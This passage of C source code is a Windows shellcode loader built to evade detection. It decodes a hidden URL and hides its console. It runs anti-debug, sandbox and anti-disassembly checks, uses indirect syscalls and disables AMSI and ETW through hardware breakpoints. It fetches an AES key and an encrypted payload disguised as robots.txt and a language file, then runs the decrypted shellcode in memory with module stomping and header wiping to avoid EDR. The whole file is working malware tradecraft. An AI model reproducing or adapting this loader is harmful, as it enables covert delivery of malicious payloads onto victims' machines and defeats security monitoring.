    NTSTATUS status = indirect_NtAllocateVirtualMemory(
        GetCurrentProcess(), &base_addr, 0,
        &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        DBG("[-] NtAlloc fallback failed: 0x%08lx", status);
        return NULL;
    }
    DBG("[+] Fallback: allocated %lu bytes at %p (unbacked RW)", (DWORD)sc_len, base_addr);

    memcpy(base_addr, sc, sc_len);

    PVOID protect_base = base_addr;
    SIZE_T protect_size = sc_len;
    ULONG old_protect = 0;
    status = indirect_NtProtectVirtualMemory(
        GetCurrentProcess(), &protect_base, &protect_size,
        PAGE_EXECUTE_READ, &old_protect);
    if (status != 0) {
        DBG("[-] NtProtect failed: 0x%08lx", status);
        return NULL;
    }
    DBG("[+] Fallback RW -> RX done");
    return base_addr;
}

// Stomp the first 4KB of shellcode in memory after beacon starts.
// Even with backed memory, the content no longer matches the file —
// this is a known anomaly EDR can detect on deep scans. Stomping
// the PE header portion removes MZ/PE signatures from memory.
static void stomp_header(PVOID addr, SIZE_T total_len) {
    SIZE_T stomp_size = (total_len < 4096) ? total_len : 4096;
    PVOID protect_base = addr;
    SIZE_T protect_size = stomp_size;
    ULONG old_protect = 0;

    NTSTATUS st = indirect_NtProtectVirtualMemory(
        GetCurrentProcess(), &protect_base, &protect_size,
        PAGE_READWRITE, &old_protect);
    if (st != 0) return;

    // Fill with bytes that look like real code (not zeroes, not pattern)
    for (SIZE_T i = 0; i < stomp_size; i++)
        ((BYTE*)addr)[i] = (BYTE)(i * 0x37 + 0x41);

    protect_base = addr;
    protect_size = stomp_size;
    indirect_NtProtectVirtualMemory(
        GetCurrentProcess(), &protect_base, &protect_size,
        PAGE_EXECUTE_READ, &old_protect);
    DBG("[+] Header stomped (%lu bytes)", (DWORD)stomp_size);
}

static BOOL execute_shellcode(unsigned char *sc, SIZE_T sc_len) {
    HMODULE hStompMod = NULL;
    PVOID base_addr = NULL;

     PRIMARY: Module stomping (backed memory) ===
    base_addr = module_stomp(sc, sc_len, &hStompMod);

     FALLBACK: VirtualAlloc (unbacked) ===
    if (!base_addr) {
        DBG("[!] Module stomp failed, falling back to VirtualAlloc");
        base_addr = alloc_and_write(sc, sc_len);
    }

    if (!base_addr) return FALSE;

     EXEC METHOD 1: NtCreateThreadEx on self (indirect syscall) ===
    HANDLE hThread = NULL;
    NTSTATUS status = indirect_NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, NULL,
        GetCurrentProcess(), base_addr, NULL,
        FALSE, 0, 0, 0, NULL);

    if (status == 0 && hThread) {
        DBG("[+] Thread created via indirect NtCreateThreadEx");
        Sleep(500);
        stomp_header(base_addr, sc_len);
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        return TRUE;
    }
    DBG("[!] NtCreateThreadEx failed: 0x%08lx, fallback...", status);

     EXEC METHOD 2: CreateThread ===
    DBG("[*] Fallback: CreateThread...");
    HANDLE hT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)base_addr, NULL, 0, NULL);
    if (hT) {
        DBG("[+] Fallback thread via CreateThread");
        Sleep(500);
        stomp_header(base_addr, sc_len);
        WaitForSingleObject(hT, INFINITE);
        CloseHandle(hT);
        return TRUE;
    }

     EXEC METHOD 3: Direct call (last resort) ===
    DBG("[!] All thread methods failed, direct call...");
    ((void(*)())base_addr)();
    return TRUE;
}


// Entry point

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    // Hide console window immediately in prod (no flash)
#ifndef DEBUG
    HWND cw = GetConsoleWindow();
    if (cw) ShowWindow(cw, SW_HIDE);
    PROD_INIT();
#endif

    dilute_imports();  // Populate import table with benign APIs
    DBG("[*] Loader started");

    char *cmd = lpCmdLine;
    while (*cmd == ' ') cmd++;
    if (!*cmd) { DBG("[-] No argument provided"); return 0; }
    DBG("[*] Raw arg: %s", cmd);

    char encoded[1024] = {0};
    strncpy(encoded, cmd, sizeof(encoded) - 1);
    char *end = encoded + strlen(encoded) - 1;
    while (end > encoded && (*end == ' ' || *end == '\r' || *end == '\n'))
        { *end = '\0'; end--; }

    // XOR decode URL
    char base_url[512] = {0};
    int url_len = xor_decode_url(encoded, base_url, sizeof(base_url));
    if (url_len <= 0) { DBG("[-] URL decode failed (len=%d)", url_len); return 0; }
    SecureZeroMemory(encoded, sizeof(encoded));
    DBG("[+] Decoded URL: %s", base_url);

    int blen = (int)strlen(base_url);
    while (blen > 0 && base_url[blen-1] == '/') { base_url[--blen] = '\0'; }

    resolve_base_apis();
    DBG("[+] Base APIs resolved");

    ANTI_DISASM();

    // Anti-debug (skip in debug build)
#ifndef DEBUG
    if (is_debugged()) return 0;
#endif

    if (is_sandbox()) { DBG("[-] Sandbox detected"); return 0; }
    DBG("[+] Sandbox check passed");

    if (!opaque_true()) return 0;

    // Resolve indirect syscalls (read SSNs from clean ntdll on disk)
    if (!resolve_syscalls()) {
        DBG("[-] Syscall resolution failed");
        return 0;
    }
    DBG("[+] Indirect syscalls ready");

    // HW breakpoint AMSI/ETW bypass (no memory patching)
    patch_amsi_etw_hwbp();
    DBG("[+] AMSI + ETW bypassed via HW breakpoints");

    ANTI_DISASM();

    // Fetch key (/robots.txt)
    char fn_key[]={ENC('r'),ENC('o'),ENC('b'),ENC('o'),ENC('t'),ENC('s'),ENC('.'),ENC('t'),ENC('x'),ENC('t'),0};
    for(int i=0;fn_key[i];i++) fn_key[i]^=SXOR_KEY;
    char key_url[512];
    build_url(base_url, fn_key, key_url, sizeof(key_url));
    SecureZeroMemory(fn_key, sizeof(fn_key));
    DBG("[*] Fetching key: %s", key_url);

    DWORD key_size = 0;
    unsigned char *key_raw = http_download(key_url, &key_size);
    SecureZeroMemory(key_url, sizeof(key_url));
    if (!key_raw || key_size < 64) {
        DBG("[-] Key fetch failed (size=%lu)", key_size);
        if (key_raw) free(key_raw); return 0;
    }
    DBG("[+] Key fetched (%lu bytes)", key_size);

    char key_hex[65] = {0};
    int ki = 0;
    for (DWORD i = 0; i < key_size && ki < 64; i++) {
        char c = (char)key_raw[i];
        if ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'))
            key_hex[ki++] = c;
    }
    SecureZeroMemory(key_raw, key_size);
    free(key_raw);

    if (ki != 64) { DBG("[-] Key length %d, expected 64", ki); return 0; }

    unsigned char aes_key[32];
    if (hex2bytes(key_hex, aes_key, 32) != 32) { DBG("[-] Key decode failed"); return 0; }
    SecureZeroMemory(key_hex, 65);

    // Fetch payload (/english.lang)
    char fn_pay[]={ENC('e'),ENC('n'),ENC('g'),ENC('l'),ENC('i'),ENC('s'),ENC('h'),ENC('.'),
                   ENC('l'),ENC('a'),ENC('n'),ENC('g'),0};
    for(int i=0;fn_pay[i];i++) fn_pay[i]^=SXOR_KEY;
    char payload_url[512];
    build_url(base_url, fn_pay, payload_url, sizeof(payload_url));
    SecureZeroMemory(fn_pay, sizeof(fn_pay));
    DBG("[*] Fetching payload: %s", payload_url);

    SecureZeroMemory(base_url, sizeof(base_url));

    DWORD blob_size = 0;
    unsigned char *blob = http_download(payload_url, &blob_size);
    SecureZeroMemory(payload_url, sizeof(payload_url));
    if (!blob || blob_size < 24) {
        DBG("[-] Payload fetch failed (size=%lu)", blob_size);
        if (blob) free(blob); return 0;
    }
    DBG("[+] Payload fetched (%lu bytes)", blob_size);

    DWORD original_size = *(DWORD *)(blob);
    unsigned char *iv   = blob + 8;
    unsigned char *enc  = blob + 24;
    DWORD enc_len       = blob_size - 24;

    // Decrypt
    unsigned char *decrypted = (unsigned char *)VirtualAlloc(
        NULL, enc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decrypted) { free(blob); return 0; }

    DWORD dec_len = 0;
    if (aes_decrypt(enc, enc_len, aes_key, iv, decrypted, &dec_len) != 0) {
        DBG("[-] AES decrypt failed");
        SecureZeroMemory(aes_key, 32);
        VirtualFree(decrypted, 0, MEM_RELEASE);
        free(blob);
        return 0;
    }
    DBG("[+] Decrypted %lu bytes", dec_len);

    SecureZeroMemory(aes_key, 32);
    SecureZeroMemory(blob, blob_size);
    free(blob);

    // Decompress
    unsigned char *shellcode = (unsigned char *)VirtualAlloc(
        NULL, original_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!shellcode) {
        SecureZeroMemory(decrypted, enc_len);
        VirtualFree(decrypted, 0, MEM_RELEASE);
        return 0;
    }

    uLongf decompressed_size = original_size;
    int zret = uncompress(shellcode, &decompressed_size, decrypted, dec_len);
    SecureZeroMemory(decrypted, enc_len);
    VirtualFree(decrypted, 0, MEM_RELEASE);

    if (zret != Z_OK) {
        DBG("[-] Decompress failed (zlib %d)", zret);
        VirtualFree(shellcode, 0, MEM_RELEASE);
        return 0;
    }
    DBG("[+] Decompressed %lu bytes", (DWORD)decompressed_size);

    ANTI_DISASM();

    // Execute: alloc RX in self, run thread, stomp header
    // Fallback chain inside execute_shellcode:
    //   NtCreateThreadEx (indirect) → CreateThread → direct call
    DBG("[*] Executing shellcode (%lu bytes)...", (DWORD)decompressed_size);
    BOOL ok = execute_shellcode(shellcode, decompressed_size);

    // Wipe the decompression buffer (execution uses its own copy)
    SecureZeroMemory(shellcode, decompressed_size);
    VirtualFree(shellcode, 0, MEM_RELEASE);

    if (!ok) {
        DBG("[-] All execution methods failed");
        return 1;
    }

    DBG("[+] Done");
    return 0;
}
